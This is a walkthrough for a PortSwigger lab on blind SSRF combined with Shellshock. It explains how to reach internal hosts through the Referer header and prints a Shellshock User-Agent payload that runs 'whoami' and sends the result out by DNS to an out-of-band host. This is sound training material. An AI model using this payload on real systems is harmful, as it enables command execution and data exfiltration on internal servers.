# Lab 05 — Blind SSRF with Shellshock exploitation

> **Expert** · [Official lab](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)

**Entry point:** the `Referer` header is fetched server-side (blind SSRF);

> **Burp Community alternative (free):** Collaborator is Pro-only. Use a free out-of-band service instead — [interact.sh](https://interact.sh) or [canarytokens.org](https://canarytokens.org) give you a unique subdomain with **DNS + HTTP** logging (HTTP-only option: [webhook.site](https://webhook.site)). Substitute its domain wherever this write-up says `YOUR-COLLABORATOR-SUBDOMAIN`.
the internal system runs a vulnerable Bash (Shellshock).

## Solution

1. Set the `Referer` header to a URL on your free OOB service while browsing
   product pages — the internal fetch triggers an SSRF interaction (visible
   on your OOB dashboard), and the request carries your `User-Agent`.
2. Build the Shellshock payload ( Collaborator subdomain inserted):

```
() { :; }; /usr/bin/nslookup $(whoami).YOUR-COLLABORATOR-SUBDOMAIN
```

3. Put it in `User-Agent`, set `Referer: http://192.168.0.1:8080`, and
   Intruder-scan the last octet (1–255).
4. **Poll now** — a DNS interaction arrives from the hit back-end; the
   subdomain contains the OS user name (view it in the interaction
   Description).
5. Submit the user name — lab solved.

## Notes

Shellshock turns any CGI environment variable (like HTTP_USER_AGENT) into
command execution — combined with SSRF it reaches systems with no inbound
access.
